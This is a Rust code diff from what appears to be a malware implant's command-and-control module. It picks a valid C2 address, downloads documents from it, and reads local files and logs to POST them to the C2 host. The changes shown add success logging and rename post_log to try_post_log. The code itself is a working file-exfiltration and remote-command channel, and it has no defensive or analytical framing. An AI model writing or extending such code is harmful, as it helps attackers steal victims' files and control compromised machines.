@@ -25,7 +25,9 @@ pub fn get_commands(c2s: Vec<Addr>, docname: Docname) {
     }
 
     if let Ok(c2) = get_valid_c2(c2s) {
-        download_doc(&c2, &docname);
+        if download_doc(&c2, &docname).is_ok() {
+            info!("successfully downloaded {docname} from {c2}")
+        }
     }
 }
 
@@ -90,7 +92,7 @@ fn blocking_post(addr: &Addr, body: String) -> Result<(), ()> {
 fn upload_doc(addr: &Addr, docname: &Docname) -> Result<(), ()> {
     info!("uploading doc {:?} to {:?}", docname, addr);
     if let Ok(body) = std::fs::read_to_string(docname) {
-        match blocking_post(&addr, body) {
+        match blocking_post(addr, body) {
             Ok(_) => Ok(info!("upload doc to {addr} successful")),
             Err(msg) => Err(error!("{msg:?}")),
         }
@@ -99,9 +101,11 @@ fn upload_doc(addr: &Addr, docname: &Docname) -> Result<(), ()> {
     }
 }
 
-pub fn post_log(c2s: Vec<Addr>, logpath: String) {
+pub fn try_post_log(c2s: Vec<Addr>, logpath: String) {
     if let Ok(c2) = get_valid_c2(c2s) {
-        upload_doc(&c2, &logpath);
+        if upload_doc(&c2, &logpath).is_ok() {
+            info!("successfully posted log {logpath} to {c2}")
+        }
     }
 }
 
